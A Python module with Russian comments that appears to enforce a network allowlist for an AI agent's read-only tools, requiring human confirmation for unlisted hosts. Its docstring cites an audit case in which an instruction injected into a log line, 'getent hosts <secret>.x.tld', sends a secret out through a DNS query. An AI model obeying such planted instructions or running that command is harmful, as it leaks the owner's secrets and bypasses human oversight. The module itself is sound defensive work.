"""Куда читающий вызов может ходить по сети без подтверждения.

Вызов, который резолвит имя или подключается к хосту, — канал наружу, даже если он
ничего не меняет: внедрённая в строку лога инструкция «getent hosts <секрет>.x.tld»
выносит данные DNS-запросом, а `ssh_query` на чужой хост отдаёт ему сам текст
команды — и всё без единой кнопки (аудит 25.09, S1). Поэтому без подтверждения —
только хосты, которые назвал владелец: NETWORK_ALLOWED и адреса из его же настроек
(TLS-эндпоинты мониторинга, панель Remnawave). К остальным — через инструмент с
подтверждением, где человек видит адрес.
"""
from urllib.parse import urlsplit

from app.config import settings

# Сам сервер: сюда можно всегда.
_LOCAL = frozenset({"localhost", "127.0.0.1", "::1"})


def _norm(host: str) -> str:
    return host.strip().lower().rstrip(".")


def _allowed() -> tuple[frozenset[str], tuple[str, ...]]:
    """(имена и адреса, суффиксы `.домен`). Читается на каждый вызов — дёшево, а
    настройки не залипают в модуле."""
    names = set(_LOCAL)
    suffixes: list[str] = []
    for entry in settings.network_allowed.split(","):
        entry = _norm(entry)
        if entry.startswith("."):
            suffixes.append(entry)
        elif entry:
            names.add(entry)
    for endpoint in settings.monitor_tls_endpoints.split(","):
        endpoint = endpoint.strip()
        if host := _norm(endpoint.rpartition(":")[0] or endpoint):
            names.add(host)
    if host := urlsplit(settings.remnawave_base_url).hostname:
        names.add(_norm(host))
    return frozenset(names), tuple(suffixes)


def is_allowed(host: str) -> bool:
    """Можно ли связаться с `host` (имя или IP, без порта и user@) без подтверждения.
    `.example.com` в NETWORK_ALLOWED — сам домен и все поддомены."""
    host = _norm(host)
    names, suffixes = _allowed()
    return host in names or any(host == s[1:] or host.endswith(s) for s in suffixes)


def refusal_reason(host: str, how: str) -> str:
    """Отказ с адресом: `how` — куда идти, если хост свой."""
    return (f"{host} нет в NETWORK_ALLOWED: без подтверждения система связывается только "
            f"с хостами владельца — иначе это канал наружу. Хост свой — {how}; а "
            "постоянно — пусть владелец добавит его в NETWORK_ALLOWED.")
